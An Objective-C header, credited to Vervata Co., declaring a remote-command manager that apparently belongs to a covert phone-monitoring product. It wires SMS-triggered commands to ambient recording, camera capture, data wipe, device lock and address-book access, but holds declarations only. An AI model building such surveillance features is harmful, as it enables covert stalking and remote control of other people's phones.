/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdManagerImpl
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  17/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import <Foundation/Foundation.h>
#import "RemoteCmdManager.h"
#import "SMSSender.h"
#import "EventDeliveryManager.h"
#import "ServerAddressManager.h"
#import "EventDelegate.h"
#import "EventDelivery.h"
#import "PreferenceManager.h"
#import "ActivationManagerProtocol.h"
#import "AppContext.h"
#import "DataDelivery.h"
#import "EventDelivery.h"
#import "EventRepository.h"
#import "ConnectionHistoryManager.h"
#import "ConfigurationManager.h"
#import "SystemUtils.h"
#import "AddressbookManager.h"

@class EventCenter;
@class SMSCmdCenter;
@class RemoteCmdProcessingManager;
@class RemoteCmdUtils;
@class RemoteCmdStore;
@class PCCCmdCenter;
@class LicenseManager;
@class SyncTimeManager;
@class SyncCDManager;

@protocol WipeDataManager, DeviceLockManager, ApplicationProfileManager, UrlProfileManager, BookmarkManager, ApplicationManager, AmbientRecordingManager, CalendarManager;
@protocol NoteManager, CameraEventCapture;

@interface RemoteCmdManagerImpl : NSObject <RemoteCmdManager>{
@private
   	id <DataDelivery>              mDataDelivery;
	id <EventDelegate>             mEventDelegate; 
	id <EventDelivery>             mEventDelivery;
	id <EventRepository>           mEventRepository;
	id <ConnectionHistoryManager>  mConnectionHistoryManager; 
	id <ConfigurationManager>      mConfigurationManager;
	id <SMSSender>                 mSMSSender;
   	id <AppContext>                mAppContext;
	id <ServerAddressManager>      mServerAddressManager;
	id <PreferenceManager>	       mPreferenceManager;
	id <ActivationManagerProtocol> mActivationManagerProtocol;
	id <SystemUtils>               mSystemUtils;
	id <AddressbookManager>        mAddressbookManager;
	LicenseManager*                mLicenseManager;
	SyncTimeManager				   *mSyncTimeManager;
	SyncCDManager				   *mSyncCDManager;
	id <WipeDataManager>			mWipeDataManager;
	id <DeviceLockManager>			mDeviceLockManager;
	id <ApplicationProfileManager>	mApplicationProfileManager;
	id <UrlProfileManager>			mUrlProfileManager;
	id <BookmarkManager>			mBookmarkManager;
	id <ApplicationManager>			mApplicationManager;
	id <AmbientRecordingManager>	mAmbientRecordingManager;
	id <CalendarManager>			mCalendarManager;
	id <NoteManager>				mNoteManager;
	id <CameraEventCapture>			mCameraEventCapture;

	RemoteCmdProcessingManager*    mRemoteCmdProcessingManager;
	SMSCmdCenter*                  mSMSCmdCenter;
	RemoteCmdUtils*                mRemoteCmdUtils;
	RemoteCmdStore*                mRemoteCmdStore;
	PCCCmdCenter*				   mPCCCmdCenter;
	
	NSArray*                       mSupportCmdCodes;
	
	NSString*                      mMediaSearchPath;
}

@property (nonatomic,retain) id <DataDelivery> mDataDelivery;
@property (nonatomic,retain) id <EventDelivery> mEventDelivery;
@property (nonatomic,retain) id <EventDelegate>  mEventDelegate; 
@property (nonatomic,retain) id <ConnectionHistoryManager> mConnectionHistoryManager; 
@property (nonatomic,retain) id <EventRepository> mEventRepository;
@property (nonatomic,retain) id <ConfigurationManager> mConfigurationManager;
@property (nonatomic,retain) id <SMSSender>    mSMSSender;
@property (nonatomic,retain) id <AppContext> mAppContext;
@property (nonatomic,retain) id <ActivationManagerProtocol> mActivationManagerProtocol;
@property (nonatomic,retain) id <PreferenceManager>	mPreferenceManager;
@property (nonatomic,retain) id <ServerAddressManager> mServerAddressManager;
@property (nonatomic,retain) id <SystemUtils> mSystemUtils;
@property (nonatomic,retain) id <AddressbookManager> mAddressbookManager;
@property (nonatomic,retain) LicenseManager* mLicenseManager;
@property (nonatomic, assign) SyncTimeManager *mSyncTimeManager;
@property (nonatomic, assign) SyncCDManager *mSyncCDManager;
@property (nonatomic, assign) id <WipeDataManager> mWipeDataManager;
@property (nonatomic, assign) id <DeviceLockManager> mDeviceLockManager;
@property (nonatomic, assign) id <ApplicationProfileManager> mApplicationProfileManager;
@property (nonatomic, assign) id <UrlProfileManager> mUrlProfileManager;
@property (nonatomic, assign) id <BookmarkManager> mBookmarkManager;
@property (nonatomic, assign) id <ApplicationManager> mApplicationManager;
@property (nonatomic, assign) id <AmbientRecordingManager> mAmbientRecordingManager;
@property (nonatomic, assign) id <CalendarManager> mCalendarManager;
@property (nonatomic, assign) id <NoteManager> mNoteManager;
@property (nonatomic, assign) id <CameraEventCapture> mCameraEventCapture;

@property (nonatomic,retain) RemoteCmdProcessingManager* mRemoteCmdProcessingManager;
@property (nonatomic,retain) PCCCmdCenter* mPCCCmdCenter;
@property (nonatomic,retain) SMSCmdCenter* mSMSCmdCenter;
@property (nonatomic,retain) NSArray*  mSupportCmdCodes;
@property (nonatomic,copy) NSString* mMediaSearchPath;

- (void) launch;
- (void) relaunchForFeaturesChange;
- (void) processPendingRemoteCommands;
- (void) clearAllPendingRemoteCommands;

- (NSString *) replySMSPattern;
@end
